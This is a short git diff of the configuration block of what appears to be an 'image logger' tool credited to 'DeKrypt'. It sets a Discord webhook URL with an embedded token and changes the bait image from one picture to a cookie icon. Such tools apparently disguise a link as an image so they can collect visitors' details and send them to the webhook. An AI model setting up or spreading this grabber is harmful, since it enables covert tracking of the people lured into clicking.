@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1567030117010640979/nuNcz2xBFZ0tKXbJ6Nz-MkeylbVUBsCQJ5k0XPvGnIsUkDFdrUi0KMDGYxk6TTxoEsmc",
-    "image": "https://static.wikia.nocookie.net/youtube/images/5/58/Speed_McQueen_Face.png/revision/latest?cb=20250729033052", # You can also have a custom image by using a URL argument
+    "image": "https://png.pngtree.com/png-vector/20250425/ourmid/pngtree-chocolate-chip-cookie-icon-white-background-png-image_16100260.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
